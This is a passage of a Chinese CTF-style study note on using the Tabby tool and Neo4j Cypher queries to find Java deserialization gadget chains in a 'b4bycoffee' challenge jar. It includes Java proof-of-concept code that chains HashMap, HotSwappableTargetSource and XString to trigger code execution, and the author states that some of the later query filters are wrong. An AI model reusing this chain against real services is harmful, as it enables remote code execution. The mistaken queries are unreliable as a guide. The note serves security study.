+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">tabby.cache.isDockerImportPath</span>            = <span class="string">true</span></span><br><span class="line"><span class="attr">tabby.output.directory</span>                    = <span class="string">env/import</span></span><br><span class="line"></span><br><span class="line"><span class="attr">tabby.build.target</span>                        = <span class="string">cases/b4bycoffee-0.0.1-SNAPSHOT.jar</span></span><br><span class="line"><span class="attr">tabby.build.mode</span>                          = <span class="string">gadget</span></span><br><span class="line"></span><br><span class="line"><span class="attr">tabby.build.isJDKProcess</span>                  = <span class="string">true</span></span><br><span class="line"><span class="attr">tabby.build.enable</span>                        = <span class="string">true</span></span><br><span class="line"><span class="attr">tabby.load.enable</span>                         = <span class="string">true</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="Case1-HashMap-HotSwappableTargetSource-equals-XString-equals-toString"><a href="#Case1-HashMap-HotSwappableTargetSource-equals-XString-equals-toString" class="headerlink" title="Case1 (HashMap -&gt; HotSwappableTargetSource.equals -&gt; XString.equals -&gt; .toString)"></a>Case1 (HashMap -&gt; HotSwappableTargetSource.equals -&gt; XString.equals -&gt; .toString)</h5><p>根据<a target="_blank" rel="noopener" href="https://github.com/wh1t3p1g/tabby-path-finder">https://github.com/wh1t3p1g/tabby-path-finder</a>中的示例写出查询语句，先限定source的classname为HashMap以缩小范围：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method &#123;NAME:&quot;readObject&quot;,CLASSNAME:&quot;java.util.HashMap&quot;&#125;)</span><br><span class="line">match (sink:Method &#123;NAME0:&quot;com.example.b4bycoffee.model.CoffeeBean.toString&quot;&#125;)</span><br><span class="line">with source, collect(sink) as sinks</span><br><span class="line">call tabby.algo.findJavaGadget(source, sinks, 8, false, false) yield path</span><br><span class="line">return path limit 1</span><br></pre></td></tr></table></figure>
+
+<p>再根据结果排除一些误报：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method &#123;NAME:&quot;readObject&quot;,CLASSNAME:&quot;java.util.HashMap&quot;&#125;)</span><br><span class="line">match (sink:Method &#123;NAME0:&quot;com.example.b4bycoffee.model.CoffeeBean.toString&quot;&#125;)</span><br><span class="line">with source, collect(sink) as sinks</span><br><span class="line">call tabby.algo.findJavaGadget(source, sinks, 8, false, false) yield path</span><br><span class="line">where none(n in nodes(path) where </span><br><span class="line">    n.NAME0 in [&quot;com.sun.xml.internal.ws.api.BindingID.equals&quot;,&quot;org.yaml.snakeyaml.events.Event.equals&quot;,&quot;com.sun.corba.se.spi.orb.OperationFactory$OperationBase.equals&quot;,&quot;org.springframework.cache.interceptor.CacheOperation.equals&quot;,&quot;javax.swing.text.html.HTML$UnknownTag.equals&quot;]</span><br><span class="line">)</span><br><span class="line">return path limit 1</span><br></pre></td></tr></table></figure>
+
+<p>可以得到如下路径：</p>
+<p><img src="/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/image-20230526013111136.png" alt="image-20230526013111136"></p>
+<p>调用栈为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">com.example.b4bycoffee.model.CoffeeBean#toString()</span><br><span class="line">java.lang.Object#toString()</span><br><span class="line">com.sun.org.apache.xpath.internal.objects.XString#equals(java.lang.Object)</span><br><span class="line">java.lang.Object#equals(java.lang.Object)</span><br><span class="line">java.util.HashMap#putVal(int,java.lang.Object,java.lang.Object,boolean,boolean)</span><br><span class="line">java.util.HashMap#readObject(java.io.ObjectInputStream)</span><br></pre></td></tr></table></figure>
+
+<p>如果可行的话，那么POC应该这样构造：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">CoffeeBean</span> <span class="variable">coffeeBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CoffeeBean</span>();</span><br><span class="line">Tool.setFieldValue(coffeeBean, <span class="string">&quot;ClassByte&quot;</span>, Tool.getCMDByteCodes(<span class="string">&quot;touch /tmp/success&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">hashMap.put(coffeeBean, <span class="string">&quot;x&quot;</span>);</span><br><span class="line">hashMap.put(xString, <span class="string">&quot;x&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> Tool.encodeBase64(Tool.serialize(hashMap));</span><br></pre></td></tr></table></figure>
+
+<p>但其实这样是不行的，从<code>java.util.HashMap#putVal(int,java.lang.Object,java.lang.Object,boolean,boolean)</code>到<code>java.lang.Object#equals(java.lang.Object)</code>，其实是HashMap在反序列化时逐个读入Node并放入table的过程中，对Node的key进行比较时触发的：</p>
+<p><img src="/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/image-20230527092611872.png" alt="image-20230527092611872"></p>
+<p>而执行<code>key.equals(k)</code>的前提是<code>p.hash == hash</code>，也就是说两个Node的key的hash必须相同，HashMap中计算Key的hash是直接调用其hashCode方法</p>
+<p><code>com.sun.org.apache.xpath.internal.objects.XString</code>中实现了hashCode方法，并且我们可以通过设置其中的<code>m_obj</code>为合适的字符串而让其hashCode为任意值</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> str().hashCode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">str</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="literal">null</span> != m_obj) ? ((String) m_obj) : <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是<code>CoffeeBean</code>并未实现hashCode方法，这将调用<code>Object.hashCode()</code>，并且生成不可预测的hash值</p>
+<p>不过我们可以利用<code>org.springframework.aop.target.HotSwappableTargetSource</code>类来当做一个”中继”，因为<code>HotSwappableTargetSource</code>实现了hashCode方法，并且每个<code>HotSwappableTargetSource</code>对象的hash值都是一样的，而且其equals方法会继续调用<code>target</code>对象的equals方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> HotSwappableTargetSource.class.hashCode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object other)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span> == other || other <span class="keyword">instanceof</span> HotSwappableTargetSource &amp;&amp; <span class="built_in">this</span>.target.equals(((HotSwappableTargetSource)other).target);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个trick在<a target="_blank" rel="noopener" href="https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true">marshalsec</a>这篇paper中有提到</p>
+<p><img src="/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/image-20230527101015470.png" alt="image-20230527101015470"></p>
+<p>最终POC构造为：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">CoffeeBean</span> <span class="variable">coffeeBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CoffeeBean</span>();</span><br><span class="line">Tool.setFieldValue(coffeeBean, <span class="string">&quot;ClassByte&quot;</span>, Tool.getCMDByteCodes(<span class="string">&quot;touch /tmp/success&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">HotSwappableTargetSource</span> <span class="variable">hotSwappableTargetSource1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(coffeeBean);</span><br><span class="line"><span class="type">HotSwappableTargetSource</span> <span class="variable">hotSwappableTargetSource2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(xString);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">hashMap.put(hotSwappableTargetSource1, <span class="string">&quot;x&quot;</span>);</span><br><span class="line">hashMap.put(hotSwappableTargetSource2, <span class="string">&quot;x&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> Tool.encodeBase64(Tool.serialize(hashMap));</span><br></pre></td></tr></table></figure>
+
+<p>调用栈：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">toString(), CoffeeBean (com.example.b4bycoffee.model)</span><br><span class="line">equals(Object), XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">equals(Object), HotSwappableTargetSource (org.springframework.aop.target)</span><br><span class="line">putVal(int, Object, Object, boolean, boolean), HashMap (java.util)</span><br><span class="line">readObject(ObjectInputStream), HashMap (java.util)</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="Case2-❌"><a href="#Case2-❌" class="headerlink" title="Case2 (❌)"></a>Case2 (❌)</h5><blockquote>
+<p>写这一小节时，我对cypher语句的理解有误，导致有些误报排除的语句冗余或者错误，但写了很长已经懒得改了，小结末尾有指出错误点。</p>
+</blockquote>
+<p>前文已经发现这样不行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.sun.org.apache.xpath.internal.objects.XString#equals(java.lang.Object)</span><br><span class="line">java.util.HashMap#putVal(int,java.lang.Object,java.lang.Object,boolean,boolean)</span><br></pre></td></tr></table></figure>
+
+<p>但是这样可以：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">equals(Object), XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">equals(Object), HotSwappableTargetSource (org.springframework.aop.target)</span><br><span class="line">putVal(int, Object, Object, boolean, boolean), HashMap (java.util)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>那么可以继续修改查询语句，将<code>HashMap.putVal()</code>调用非<code>HotSwappableTargetSource.equals()</code>的情况排除掉：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method &#123;NAME:&quot;readObject&quot;,CLASSNAME:&quot;java.util.HashMap&quot;&#125;)</span><br><span class="line">match (sink:Method &#123;NAME0:&quot;com.example.b4bycoffee.model.CoffeeBean.toString&quot;&#125;)</span><br><span class="line">with source, collect(sink) as sinks</span><br><span class="line">call tabby.algo.findJavaGadget(source, sinks, 8, false, false) yield path</span><br><span class="line">where none(n in nodes(path) where </span><br><span class="line">    n.NAME0 in [&quot;com.sun.xml.internal.ws.api.BindingID.equals&quot;,&quot;org.yaml.snakeyaml.events.Event.equals&quot;,&quot;com.sun.corba.se.spi.orb.OperationFactory$OperationBase.equals&quot;,&quot;org.springframework.cache.interceptor.CacheOperation.equals&quot;,&quot;javax.swing.text.html.HTML$UnknownTag.equals&quot;]</span><br><span class="line">) and none(n in nodes(path) where </span><br><span class="line">    (:Method&#123; NAME0:&quot;java.util.HashMap.putVal&quot; &#125;)-[:CALL]-&gt;(:Method&#123;NAME0:&quot;java.lang.Object.equals&quot;&#125;)-[:ALIAS]-&gt;(n)</span><br><span class="line">    and</span><br><span class="line">    n.NAME0 &lt;&gt; &quot;org.springframework.aop.target.HotSwappableTargetSource.equals&quot;</span><br><span class="line">)</span><br><span class="line">return path limit 1</span><br></pre></td></tr></table></figure>
+
+
+
+<p>再排除一些误报：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method &#123;NAME:&quot;readObject&quot;,CLASSNAME:&quot;java.util.HashMap&quot;&#125;)</span><br><span class="line">match (sink:Method &#123;NAME0:&quot;com.example.b4bycoffee.model.CoffeeBean.toString&quot;&#125;)</span><br><span class="line">with source, collect(sink) as sinks</span><br><span class="line">call tabby.algo.findJavaGadget(source, sinks, 8, false, false) yield path</span><br><span class="line">where none(n in nodes(path) where </span><br><span class="line">    n.NAME0 in [&quot;com.sun.xml.internal.ws.api.BindingID.equals&quot;,&quot;org.yaml.snakeyaml.events.Event.equals&quot;,&quot;com.sun.corba.se.spi.orb.OperationFactory$OperationBase.equals&quot;,&quot;org.springframework.cache.interceptor.CacheOperation.equals&quot;,&quot;javax.swing.text.html.HTML$UnknownTag.equals&quot;]</span><br><span class="line">) and none(n in nodes(path) where </span><br><span class="line">    (:Method&#123; NAME0:&quot;java.util.HashMap.putVal&quot; &#125;)-[:CALL]-&gt;(:Method&#123;NAME0:&quot;java.lang.Object.equals&quot;&#125;)-[:ALIAS]-&gt;(n)</span><br><span class="line">    and</span><br><span class="line">    n.NAME0 &lt;&gt; &quot;org.springframework.aop.target.HotSwappableTargetSource.equals&quot;</span><br><span class="line">) and none(n in nodes(path) where </span><br><span class="line">    n.CLASSNAME in [&quot;com.sun.corba.se.spi.orb.OperationFactory$OperationBase&quot;]</span><br><span class="line">)</span><br><span class="line">return path limit 1</span><br></pre></td></tr></table></figure>
+
+<p>查询出了一开始人工审的那条链：</p>
+<p><img src="/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/image-20230527104429695.png" alt="image-20230527104429695"></p>
+<p>排除这条链，排除题目中的黑名单，增大maxNodeLength，继续查询：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method &#123;NAME:&quot;readObject&quot;,CLASSNAME:&quot;java.util.HashMap&quot;&#125;)</span><br><span class="line">match (sink:Method &#123;NAME0:&quot;com.example.b4bycoffee.model.CoffeeBean.toString&quot;&#125;)</span><br><span class="line">with source, collect(sink) as sinks</span><br><span class="line">call tabby.algo.findJavaGadget(source, sinks, 12, false, false) yield path</span><br><span class="line">where none(n in nodes(path) where </span><br><span class="line">    n.NAME0 in [&quot;com.sun.xml.internal.ws.api.BindingID.equals&quot;,&quot;org.yaml.snakeyaml.events.Event.equals&quot;,&quot;com.sun.corba.se.spi.orb.OperationFactory$OperationBase.equals&quot;,&quot;org.springframework.cache.interceptor.CacheOperation.equals&quot;,&quot;javax.swing.text.html.HTML$UnknownTag.equals&quot;,&quot;com.rometools.rome.feed.impl.EqualsBean.hashCode&quot;]</span><br><span class="line">) and none(n in nodes(path) where </span><br><span class="line">    (:Method&#123; NAME0:&quot;java.util.HashMap.putVal&quot; &#125;)-[:CALL]-&gt;(:Method&#123;NAME0:&quot;java.lang.Object.equals&quot;&#125;)-[:ALIAS]-&gt;(n)</span><br><span class="line">    and</span><br><span class="line">    n.NAME0 &lt;&gt; &quot;org.springframework.aop.target.HotSwappableTargetSource.equals&quot;</span><br><span class="line">) and none(n in nodes(path) where </span><br><span class="line">    n.CLASSNAME in [&quot;com.sun.corba.se.spi.orb.OperationFactory$OperationBase&quot;,&quot;javax.management.BadAttributeValueExpException&quot;,&quot;com.rometools.rome.feed.impl.ObjectBean&quot;,&quot;com.rometools.rome.feed.impl.ToStringBean&quot;,&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;]</span><br><span class="line">)</span><br><span class="line">return path limit 1</span><br></pre></td></tr></table></figure>
+
+<p>运行了好一会没有跑出结果</p>
+<p>那么放宽我们source的条件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method &#123;NAME:&quot;readObject&quot;&#125;)</span><br><span class="line">match (sink:Method &#123;NAME0:&quot;com.example.b4bycoffee.model.CoffeeBean.toString&quot;&#125;)</span><br><span class="line">with source, collect(sink) as sinks</span><br><span class="line">call tabby.algo.findJavaGadget(source, sinks, 8, false, false) yield path</span><br><span class="line">where none(n in nodes(path) where </span><br><span class="line">    n.NAME0 in [&quot;com.sun.xml.internal.ws.api.BindingID.equals&quot;,&quot;org.yaml.snakeyaml.events.Event.equals&quot;,&quot;com.sun.corba.se.spi.orb.OperationFactory$OperationBase.equals&quot;,&quot;org.springframework.cache.interceptor.CacheOperation.equals&quot;,&quot;javax.swing.text.html.HTML$UnknownTag.equals&quot;,&quot;com.rometools.rome.feed.impl.EqualsBean.hashCode&quot;]</span><br><span class="line">) and none(n in nodes(path) where </span><br><span class="line">    (:Method&#123; NAME0:&quot;java.util.HashMap.putVal&quot; &#125;)-[:CALL]-&gt;(:Method&#123;NAME0:&quot;java.lang.Object.equals&quot;&#125;)-[:ALIAS]-&gt;(n)</span><br><span class="line">    and</span><br><span class="line">    n.NAME0 &lt;&gt; &quot;org.springframework.aop.target.HotSwappableTargetSource.equals&quot;</span><br><span class="line">) and none(n in nodes(path) where </span><br><span class="line">    n.CLASSNAME in [&quot;com.sun.corba.se.spi.orb.OperationFactory$OperationBase&quot;,&quot;javax.management.BadAttributeValueExpException&quot;,&quot;com.rometools.rome.feed.impl.ObjectBean&quot;,&quot;com.rometools.rome.feed.impl.ToStringBean&quot;,&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;]</span><br><span class="line">)</span><br><span class="line">return path limit 1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/image-20230527112506697.png" alt="image-20230527112506697"></p>
+<p>这条链的其中一环是：<code>java.awt.Window#setGraphicsConfiguration(java.awt.GraphicsConfiguration)</code> -&gt; <code>java.lang.StringBuilder#append(java.lang.Object)</code> -&gt; <code>java.lang.String#valueOf(java.lang.Object)</code> -&gt; <code>java.lang.Object#toString()</code></p>
+<p>对应代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">setGraphicsConfiguration</span><span class="params">(GraphicsConfiguration gc)</span> &#123;</span><br><span class="line">  ...</span><br><span class="line">  log.finer(<span class="string">&quot;+ Window.setGraphicsConfiguration(): new GC is \n+ &quot;</span> + getGraphicsConfiguration_NoClientCode() + <span class="string">&quot;\n+ this is &quot;</span> + <span class="built_in">this</span>);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Java中如果<code>+</code>运算符任意一边是对象的话，会优先调用对象的<code>valueOf</code>函数，如果<code>valueOf</code>返回的是对象或者没有<code>valueOf</code>方法的话，那么会调用对象的<code>toString</code>函数</p>
+<p>然后看<code>getGraphicsConfiguration_NoClientCode()</code>和<code>this</code>所对应的类的相关方法，可以在Neo4j中辅助我们查找</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">match (c:Class)</span><br><span class="line">where (</span><br><span class="line">    (c)-[:EXTENDS*]-&gt;(:Class&#123;NAME:&quot;java.awt.Window&quot;&#125;) or c.NAME=&quot;java.awt.Window&quot;</span><br><span class="line">    or</span><br><span class="line">    (c)-[:EXTENDS*]-&gt;(:Class&#123;NAME:&quot;java.awt.GraphicsConfiguration&quot;&#125;) or c.NAME=&quot;java.awt.GraphicsConfiguration&quot;</span><br><span class="line">)</span><br><span class="line">and (</span><br><span class="line">    (c)-[:HAS]-&gt;(:Method&#123;NAME:&quot;valueOf&quot;&#125;)</span><br><span class="line">    or</span><br><span class="line">    (c)-[:HAS]-&gt;(:Method&#123;NAME:&quot;toString&quot;&#125;)</span><br><span class="line">)</span><br><span class="line">return c.NAME</span><br></pre></td></tr></table></figure>
+
+<p>看完发现这条也是误报</p>
+<p>继续排除一些误报后发现在maxNodeLength为8的情况下很久都跑不出来，试着降低一点可以跑出一些，遇到一个差一点就可以构造成功的链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method &#123;NAME:&quot;readObject&quot;&#125;)</span><br><span class="line">match (sink:Method &#123;NAME0:&quot;com.example.b4bycoffee.model.CoffeeBean.toString&quot;&#125;)</span><br><span class="line">with source, collect(sink) as sinks</span><br><span class="line">call tabby.algo.findJavaGadget(source, sinks,6, false, false) yield path</span><br><span class="line">where any(n in nodes(path) where </span><br><span class="line">    (:Method&#123; NAME0:&quot;org.springframework.util.MimeType.getParameter&quot; &#125;)-[:CALL]-&gt;()-[:ALIAS]-&gt;()-[:ALIAS]-&gt;(n)</span><br><span class="line">    and</span><br><span class="line">    n.NAME0 = &quot;javax.swing.UIDefaults$TextAndMnemonicHashMap.get&quot;</span><br><span class="line">)</span><br><span class="line">return path limit 1</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>后面在不断的尝试中，发现前文我对查询语句的理解有点问题，懒得再回去修改笔记了🤣，且把问题记录一下吧。</strong></p>
+<p>比如如下语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method &#123;NAME:&quot;readObject&quot;&#125;)</span><br><span class="line">match (sink:Method &#123;NAME0:&quot;com.example.b4bycoffee.model.CoffeeBean.toString&quot;&#125;)</span><br><span class="line">with source, collect(sink) as sinks</span><br><span class="line">call tabby.algo.findJavaGadget(source, sinks,5, false, false) yield path</span><br><span class="line">where any(n in nodes(path) where </span><br><span class="line">    (n)-[:CALL]-&gt;(:Method&#123;NAME0:&quot;java.util.Hashtable.put&quot;&#125;)-[:ALIAS]-&gt;(:Method&#123;NAME0:&quot;java.security.Provider.put&quot;&#125;)</span><br><span class="line">    and </span><br><span class="line">    n.NAME0 = &quot;javax.swing.text.html.CSS.readObject&quot;</span><br><span class="line">)</span><br><span class="line">return path limit 1</span><br></pre></td></tr></table></figure>
+
+<p>我以为查询出来的path肯定会包含这条子路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(:Method&#123;NAME0:&quot;javax.swing.text.html.CSS.readObject&quot;&#125;)-[:CALL]-&gt;(:Method&#123;NAME0:&quot;java.util.Hashtable.put&quot;&#125;)-[:ALIAS]-&gt;(:Method&#123;NAME0:&quot;java.security.Provider.put&quot;&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>实则不然，这个意思是先根据如下语句查出符合条件的n节点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(n)-[:CALL]-&gt;(:Method&#123;NAME0:&quot;java.util.Hashtable.put&quot;&#125;)-[:ALIAS]-&gt;(:Method&#123;NAME0:&quot;java.security.Provider.put&quot;&#125;)</span><br><span class="line">and </span><br><span class="line">n.NAME0 = &quot;javax.swing.text.html.CSS.readObject&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后筛选出包含n节点的path，其实<code>NAME0 = &quot;javax.swing.text.html.CSS.readObject&quot;</code>的节点有且仅有那一个，所以整个语句等效于：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method &#123;NAME:&quot;readObject&quot;&#125;)</span><br><span class="line">match (sink:Method &#123;NAME0:&quot;com.example.b4bycoffee.model.CoffeeBean.toString&quot;&#125;)</span><br><span class="line">with source, collect(sink) as sinks</span><br><span class="line">call tabby.algo.findJavaGadget(source, sinks,5, false, false) yield path</span><br><span class="line">where any(n in nodes(path) where </span><br><span class="line">    n.NAME0 = &quot;javax.swing.text.html.CSS.readObject&quot;</span><br><span class="line">)</span><br><span class="line">return path limit 1</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>同理如下语句也没办法排除<code>java.util.HashMap.putVal() -&gt; 非org.springframework.aop.target.HotSwappableTargetSource.equals  </code> 这条子链</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">none(n in nodes(path) where </span><br><span class="line">    (:Method&#123; NAME0:&quot;java.util.HashMap.putVal&quot; &#125;)-[:CALL]-&gt;(:Method&#123;NAME0:&quot;java.lang.Object.equals&quot;&#125;)-[:ALIAS]-&gt;(n)</span><br><span class="line">    and</span><br><span class="line">    n.NAME0 &lt;&gt; &quot;org.springframework.aop.target.HotSwappableTargetSource.equals&quot;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>它排除的是在整个数据库中，满足这种条件的n节点。</p>
+<p>🥲</p>
